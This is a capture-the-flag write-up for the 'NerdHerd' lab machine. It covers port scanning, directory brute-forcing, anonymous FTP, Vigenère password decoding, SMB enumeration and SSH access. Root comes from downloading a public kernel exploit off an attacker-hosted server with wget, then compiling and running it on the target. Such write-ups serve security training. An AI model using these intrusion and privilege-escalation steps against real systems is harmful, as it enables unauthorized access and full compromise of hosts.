# NerdHerd – Writeup

##Short description:
NerdHerd is a fun machine that mixes multiple attack vectors: enumeration, hidden hints, cryptography (Vigenère), SMB looting, and kernel exploitation for privilege escalation. The box also includes some decoys and bonus flags, which make it more engaging.

## Enumeration

We start with an nmap scan and discover:


```python
21/tcp – FTP (Anonymous login allowed)

22/tcp – SSH

139/tcp, 445/tcp – SMB

1137/tcp – HTTP (Apache page)
```
## Initial Enumeration

On port 1137, we see an Apache default page with a strong hint:

> A YouTube video: The Trashmen - Surfin Bird - Bird is the Word 1963.

This clue will be useful later.

## Directory Scan

Using Gobuster:

```python
gobuster dir -u http://10.10.222.110 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

We find ```/admin```.

Inside the source code of the page, there are credentials encoded in Base64. After decoding, we get:

```python
username: <user>
password: fijbxslz
```

We’ll return to these credentials later.

## FTP Access

Anonymous FTP is enabled:

```python
ftp 10.10.222.110
```

We find:

An image

A text file ```hellon3rd.txt```

Reading the file gives the clue:

```python
all you need is in the leet
```
Decoding the Password

We take our Base64-decoded password ```fijbxslz``` and revisit the YouTube clue (Bird is the Word).

Using CyberChef and the Vigenère cipher with key ```BirdistheWord```, we decode the real password.

## SMB Enumeration

We don’t yet know the username, so we run enum4linux:

```python
enum4linux 10.10.222.110
```

This reveals the user: ```chuck```.

Now we can access SMB:

```python
smbclient -U 'chuck' \\\\10.10.222.110\\nerdherd_classified
```

We download ```get_secr3t.txt```, which gives us a hidden directory:

```python
/this1sn0ta******
```

Inside, we find valid SSH credentials for chuck.

User Shell

We connect via SSH:

```python
ssh chuck@10.10.222.110
```

Reading ```user.txt``` confirms user access.

## Privilege Escalation

Inside ```/home/chuck/example-content/Ubuntu_Free_Culture_Showcase```, we run:

```uname -a```


This shows a vulnerable Linux kernel version.

We check with ```searchsploit```:

```python
searchsploit linux kernel
searchsploit -m linux/local/45010.c
```

Transfer exploit to the victim:

```python
python -m http.server
```

```python
cd /tmp
wget http://10.10.10.10:8000/45010.c
gcc -o exploit 45010.c
chmod +x exploit
./exploit
```

We successfully escalate to root.

Flags

/root/root.txt → Fake / decoy flag.

The real root flag is in ```/opt/.root.txt```.

Bonus flag can be found inside:

```python
cat /root/.bash_history
```
